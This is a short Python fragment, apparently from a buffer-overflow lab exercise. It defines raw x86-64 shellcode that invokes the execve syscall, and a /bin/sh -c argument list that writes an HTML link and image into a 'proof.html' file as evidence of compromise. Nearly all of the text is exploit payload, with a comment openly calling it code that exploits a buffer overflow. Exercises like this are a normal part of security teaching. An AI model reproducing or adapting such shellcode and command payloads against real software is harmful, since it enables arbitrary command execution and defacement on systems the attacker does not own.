...
LINK = b"\"<a href=\"https://www.netflix.com/\"><img alt=\"Swirly\" src=\"https://static.vecteezy.com/packs/media/vectors/term-bg-1-666de2d9.jpg\"></a>\""
...
SCRIPT = [b"/bin/sh\x00", b"-c\x00", b"echo " + LINK + b" > jnyamiak/proof.html\x00"]

# Code that exploits buffer overflow
EXPLOIT = b"\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc7\x90\x55\x58\x58\x48\xc7\xc6\x3f\x56\x58\x58\x48\xc7\xc2\x57\x56\x58\x58\x0f\x05" 
